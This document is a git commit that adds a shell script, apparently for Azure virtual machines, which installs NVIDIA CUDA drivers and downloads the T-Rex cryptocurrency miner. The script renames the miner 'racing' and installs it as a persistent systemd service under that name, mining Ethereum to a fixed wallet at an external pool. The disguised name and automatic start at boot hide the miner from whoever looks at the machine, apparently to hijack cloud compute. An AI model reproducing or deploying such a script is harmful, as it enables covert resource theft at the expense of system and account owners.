78b088e6fc7d97525f9053733df1394cd5d024a5
tranminhthud-20 <74304943+tranminhthud-20@users.noreply.github.com>
2021-10-18 16:38:34 +0700

    Create hiepazure.sh

---
+++ hiepazure.sh
@@ -0,0 +1,17 @@
+sudo apt-get install linux-headers-$(uname -r) -y
+distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
+wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
+sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
+sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
+echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
+sudo apt-get update
+sudo apt-get -y install cuda-drivers
+sudo apt-get install libcurl3 -y
+wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
+tar xvzf t-rex-0.21.6-linux.tar.gz
+mv t-rex racing
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/quantri/racing -a ethash -o stratum+tcp://us2.ethermine.org:4444 -u 0x85c6aa49d2723b03ff8d81177669500ec7cdde5a -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo systemctl daemon-reload
+sudo systemctl enable racing.service
+myworker=$(date +'%d%m_%H%M%S')
+./racing -a ethash -o stratum+tcp://us2.ethermine.org:4444 -u 0x85c6aa49d2723b03ff8d81177669500ec7cdde5a -p x -w $myworker &
